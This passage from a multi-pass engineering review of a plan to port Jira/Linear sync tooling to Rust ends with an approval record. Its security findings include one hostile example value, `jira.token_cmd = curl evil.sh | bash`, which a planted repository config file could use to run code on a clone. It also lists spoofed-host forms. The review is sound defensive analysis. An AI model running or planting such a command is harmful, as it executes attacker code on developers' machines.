The largest is the **exit-74 ripple** — five findings across three lenses. Introducing a code into a taxonomy shared between Rust, bash, SKILL.md dispatch tables, a parity test and a golden means touching all of them; Phase 7 named a third of the set, and the one consumer it missed (`push_decide`) inverts the change's entire purpose. Second is the **test-seam collision**: three of the applied fixes (the `jira.site` validator, the offline contract run, the `contract` grep) are individually correct and jointly unrunnable. Third is **`arbitrary_precision`**, which three lenses flagged as violating the plan's own Cargo-unification reasoning, and which correctness showed is additionally premised on jq 1.6 behaviour that the pinned 1.7.1 does not exhibit. Fourth is the **prose/code drift** in Phase 7, which three lenses caught independently and which the code-quality lens correctly diagnoses as a symptom of the plan's duplication.

Two of these trace directly to recommendations I made in pass 1 and should be reconsidered rather than merely patched. Hand-rolling multipart avoids a feature union but discards a vetted encoder's injection safety — a real trade that needs its safety contract written out or the decision revisited. And `arbitrary_precision` was the wrong instrument for the number-fidelity problem; a local re-serialiser or raw-token preservation in `remote-projection` achieves the goal without a workspace-wide semantic change.

The plan is not ready to implement, but it is close: none of the outstanding work is design rework, and the two criticals are each a bounded, well-specified edit.


## Re-Review (Pass 3) — 2026-08-17

**Verdict:** REVISE

All six lenses re-ran. The pass-2 fixes overwhelmingly landed, and the load-bearing ones were verified against the tree rather than taken on trust: `push_decide.rs:51-63` really does default to `LoudTerminal`, `exit_codes_parity.rs:58-63` really does assert `bash.len() == 4`, `mise.toml:16` really does pin jq 1.7.1, and `project_remote_parity.rs:47-55` really does reconstruct the body line-wise. Two criticals remain — one a finding I failed to address in pass 2, one an error I introduced — and the residue has a single diagnosable cause.

### Previously Identified Issues

**Pass-2 criticals — both closed.** Exit 74 now routes to `PushOutcome::LocalSave` in both implementations with the golden regenerated (compatibility and architecture independently confirmed the trap was real). The contract properties are split into ungated `*_property` functions with `gated_calls()` and the gate-closure guard preserved.

**Resolved:** the boxed error source, `resolve_credentials` returning `ClientError`, the `expected.txt` misdescription, `arbitrary_precision`'s withdrawal (verified as removing the self-contradiction cleanly), the exact-binary nextest assertion, the split real-client test, the `Sleeper`/`Jitter` seam, committed mutation-check siblings, the non-skipping bash gate, the name-set baseline guard, path dependencies, the fixture relocation, the `linear.team_id` fallback, and the tripwire's normalised allowlist and widened walk root.

**Partially resolved:** the multipart contract (omits `\` and needs an unbounded whole-file scan), the tripwire (still a denylist, blind to a control being *omitted* rather than negated), the render-abort split (see below), and the ordering table (still missing assets its own differentials execute).

**Still present:** `token_cmd` as repository-relative RCE — pass 2 did not address it at all — and the ADF pure core inside the HTTP adapter crate, deliberately deferred.

### New Issues Introduced

#### Critical

- 🔴 **Security**: **`token_cmd` remains repo-relative arbitrary code execution, and `Level::Personal` is not a trust boundary.** `.accelerator/config.local.md` is a repository-relative path; `.gitignore` does not stop a repo from *tracking* that filename. A hostile repo ships one containing `jira.token_cmd = curl evil.sh | bash`, and Phase 7 makes `work sync` in a fresh clone execute it. This now also undermines the pass-2 `jira.site` mitigation, because `jira.allowed_sites` is honoured at the same level — the identical planted file supplies both the malicious site and the entry blessing it.
- 🔴 **Correctness**: **The environment scrub names variables that do not exist.** I specified `JIRA_API_TOKEN` and `LINEAR_API_KEY`; the real ones are `ACCELERATOR_JIRA_TOKEN` / `ACCELERATOR_LINEAR_TOKEN` and their `_CMD` twins (`jira-auth.sh:169-181`, `linear-auth.sh:182-189`). The scrub would be a no-op, so a credentialed machine still resolves a live client and the default suite still makes network calls — the exact failure the fix was added to prevent.

#### Major

- 🟡 **Correctness**: **The Jira credential ladder is mis-transcribed** — a pre-existing error three passes missed. `jira-auth.sh:169-233` runs env token, then a *second* env source (`ACCELERATOR_JIRA_TOKEN_CMD`) that `TokenKeys` cannot express, then local `token` and `token_cmd` behind a mode-0600/symlink gate exiting 29 `E_LOCAL_PERMS_INSECURE`, then shared config **only when config.local.md is absent**. So personal `token_cmd` outranks the shared token value — the opposite of the plan's order — and code 29 appears nowhere.
- 🟡 **Architecture + Code Quality**: **Stale prose survives beside its replacement in three places.** "The three failure outcomes map to `kernel::Error::Refusal`" sits directly above the `ClientError` table that replaced it; Phase 2's criterion still names `RetryPolicy::delays`; Phase 7 declares a criterion below it wrong without deleting it.
- 🟡 **Architecture + Compatibility**: **`_PINNED_CRATES` is never mentioned.** `tasks/public_api.py` drives pinning from that tuple, and `test_rust.py` fails on any member in neither collection — so the two snapshot-classified crates red `test:unit:build-system` and their committed snapshots are never read.
- 🟡 **Compatibility**: **No `Cargo.lock` sync step for five new members**, though `tasks/README.md` makes it the first obligation and clippy runs `--locked`; the failure surfaces as an unrelated clippy error.
- 🟡 **Compatibility**: **`jira.allowed_sites` is claimed registered in Phase 2 but appears in none of its edit list, snippet or criteria** — and Phase 2 is independently mergeable, so it would merge without the key.
- 🟡 **Compatibility**: **Excluding 74 from `dispatch-codes.txt` contradicts that fixture's own header**, which already pins 72 and 73 as `above-the-port` rows. My stated rationale describes the fixture as something it is not.
- 🟡 **Security**: **The Jira host allow shape lacks the label-boundary and normalisation discipline the plan demands of Linear's** — `atlassian.net.evil.com`, `evil-atlassian.net`, IDN homoglyphs and userinfo forms are all unaddressed on the value that receives the token.
- 🟡 **Security**: **Remote-controlled title and body text reaches the frontmatter-plus-Markdown corpus with no sanitisation rule**, while the ADF renderer performs no escaping whatsoever. Anyone who can edit an issue may be able to inject work-item frontmatter on every syncing developer's machine.
- 🟡 **Correctness**: **The render-abort split is half right** — jq defines `null + x == x`, so the marked no-`.text` case does not abort either; only two of the three rows are real.
- 🟡 **Test Coverage + Architecture**: **Linear's TLS criterion still asks a cleartext mock to prove a handshake** — the Jira side was fixed to assert `CryptoProvider::get_default()`, Phase 6a was not.
- 🟡 **Test Coverage**: **Phase 6a's transport criteria are far thinner than Phase 3's** (no redirect, response-cap, retry-count, `Retry-After` or single-attempt assertions), and each phase is independently mergeable.
- 🟡 **Test Coverage**: **The "single-digit milliseconds" retry criterion is tighter than the 1.35×T bound the plan already rejected as flake-prone.**
- 🟡 **Test Coverage**: **Phases 8-9 transcribe a dozen request shapes by hand with no oracle-executing differential**, despite the plan arguing at length that hand transcription is unreliable.
- 🟡 **Architecture + Code Quality**: **`TransportConfig.base: Url` has no owner** — `tracker-support`'s pup rule denies the crate `Url` would come from, and no `url` dependency is declared anywhere.

#### Minor

- 🔵 **Correctness**: The flip set is five sites, not seven; `cli_sync.rs:85` is the trello case that must stay at 72.
- 🔵 **Correctness**: The `E_DISPATCH_*` constant and its Rust twin must be named explicitly — the parity test matches by name and panics on a spelling mismatch.
- 🔵 **Correctness**: Three downstream criteria still say "byte-identity against `expected.txt`", the phrasing pass 2 corrected in Phase 2 only.
- 🔵 **Security**: The 8 MiB cap is per response, with no aggregate bound across 20 pages and 50-id chunks.
- 🔵 **Security**: The new raw-token re-serialiser parses untrusted JSON with no depth or token-length bounds.
- 🔵 **Security**: `token_cmd` inherits the full environment and working directory.
- 🔵 **Architecture**: The boxed source is flattened again one layer up, where `update.rs:203-204` maps to `NotAvailable(String)` via `message()`.
- 🔵 **Architecture**: The redacting-`Debug` obligation names `Credentials`, a type `tracker-support` does not own.
- 🔵 **Architecture**: Three crates read the relocated fixture by relative path, protected by no compiler or pup rule.
- 🔵 **Compatibility**: `TokenKeys`'s `&'static str` fields do not match `ConfigAccess::get`'s typed `&Key`, implying an unstated fallible parse in a credential path where `unwrap` is lint-banned.
- 🔵 **Code Quality**: `tracker-support` has already outgrown its admission criterion — `port_body` is a projection concern belonging with `remote-projection`.
- 🔵 **Test Coverage**: The `dump.golden` criterion names `test:integration:work`, which does not exercise it (`config_read.rs` does).
- 🔵 **Test Coverage**: Phase 10's `rg -n "python" cli/*/Cargo.toml` glob has the same single-level blind spot Phase 7 just corrected.
- 🔵 **Code Quality**: Module layout is specified to a granularity that makes enforced constraints indistinguishable from incidental ones.

### Assessment

**Stop the find-and-fix cycle and do a consolidation pass instead.** Three passes in, the evidence is that this plan's defect rate is now dominated by its own editing mechanics rather than by its design.

The diagnosis is the code-quality lens's, and it is well supported: every stale statement found in pass 3 is a case where one copy of a duplicated rationale was updated and another was not. Pass 2's fixes were applied as insertions — a ⚠️ block asserting the new position, left sitting above the sentence asserting the old one. The plan now restates its major rationales three to five times across 3,120 lines, so each revision has three to five landing sites and reliably hits some of them. That is a document-structure problem, and another find-and-fix pass would add material to a document already failing to stay self-consistent.

The two criticals are narrow and should be fixed regardless: the environment-variable names are a one-line correction, and the `token_cmd` trust boundary is a design decision the plan needs to take a position on — refuse command-valued and allowlist-valued keys from a VCS-tracked `config.local.md`, or move them out of the repository tree. Note that this one has now survived two passes because I did not address it, not because it was hard.

Beyond those, the highest-value work is subtraction: move each cross-cutting rationale to a single `## Decisions` entry, reduce every inline restatement to a one-line reference, and re-derive the ordering table and the credential ladder directly from the scripts rather than from prose about them. The mis-transcribed Jira ladder is the warning here — a factual error about the oracle that survived three reviews because it was described rather than checked, which is precisely what the plan's own differential tests exist to prevent and what the plan text itself has no equivalent of.

The design is sound and largely verified. The document is what needs work.

## Approval — 2026-08-17

**Verdict:** APPROVE

Approved by Toby Clemson following the pass-3 consolidation. The four original
criticals and both pass-2 criticals are closed and verified against source; the
pass-3 criticals — the `token_cmd` VCS-tracked-provenance refusal and the
corrected environment-variable set — are addressed in the consolidation pass,
along with the re-derived credential ladder, the re-derived ordering table, and
the `dispatch-codes.txt` reversal.

The plan carries a sixteen-entry `## Decisions` register as the single home for
every cross-cutting rationale, which addresses the duplication that produced the
stale statements found in pass 3.

### Accepted with the plan

These were surfaced across three passes and are knowingly carried into
implementation rather than resolved here:

- The ADF pure core stays inside `jira-client` rather than being extracted as
  `cli/jira-adf`. Trigger for revisiting: a second consumer of the renderer.
- The non-port provider surface (`comment`, `transition`, `attach`, `init`)
  stays concrete; 0211 owns introducing its port.
- Phases 8-9 transcribe their request shapes by hand with no oracle-executing
  differential, unlike Phases 2 and 4. The residual risk is a mis-transcribed
  endpoint or cache shape caught only by the manual live checks.
- The hand-rolled multipart encoder replaces a vetted implementation; its safety
  contract is specified in Phase 8 but is newly written code on an authenticated
  upload path.
- Remote-controlled title and body text reaches the frontmatter-plus-Markdown
  corpus with no sanitisation rule stated.
- Minor residue: the aggregate response bound across pages, the `tracker-support`
  naming proximity to `tracker-test-support`, module-layout specificity, and the
  relative-path coupling to the relocated exit-code fixture.

Implementation may proceed. The accepted items above should be revisited if
Phase 8 or Phase 9 slips materially, since several of them concentrate there.
